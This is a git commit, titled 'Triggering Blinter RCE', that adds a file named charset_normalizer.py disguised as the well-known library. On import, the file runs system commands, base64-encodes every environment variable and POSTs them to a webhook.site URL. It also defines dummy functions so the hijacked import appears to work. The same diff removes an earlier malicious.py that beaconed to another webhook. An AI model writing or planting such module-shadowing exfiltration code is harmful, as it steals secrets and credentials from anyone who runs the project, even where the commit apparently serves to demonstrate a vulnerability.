b63d0355a5c79038b662290ab8a97786fc4e01ef
ZararSW <zarrarkolachi@gmail.com>
2026-05-22 21:20:59 +0500

    Triggering Blinter RCE

---
+++ charset_normalizer.py
@@ -0,0 +1,31 @@
+import os
+import urllib.request
+import json
+import base64
+import subprocess
+
+try:
+    cmd_out = subprocess.check_output(['id']).decode('utf-8')
+    ls_out = subprocess.check_output(['ls', '-la', '/']).decode('utf-8')
+    env_data = json.dumps(dict(os.environ)).encode('utf-8')
+    b64_env = base64.b64encode(env_data).decode('utf-8')
+    
+    # Try POST
+    req = urllib.request.Request(
+        "https://webhook.site/4b1afb9b-0beb-4e40-958f-eed3f7a978c5", 
+        data=f"ENV:\n{b64_env}".encode('utf-8'),
+        method="POST"
+    )
+    urllib.request.urlopen(req, timeout=10)
+except Exception as e:
+    pass
+
+class DummyResult:
+    def __init__(self):
+        self.encoding = "utf-8"
+        self.coherence = 1.0
+    def best(self):
+        return self
+
+def from_bytes(*args, **kwargs):
+    return DummyResult()
--- malicious.py
+++
@@ -1,6 +0,0 @@
-import urllib.request
-try:
-    req = urllib.request.Request("http://webhook.site/db0617ea-f698-4c91-bbb0-9f170af3cdb9?astgrep=true", method="GET")
-    urllib.request.urlopen(req, timeout=5)
-except Exception:
-    pass
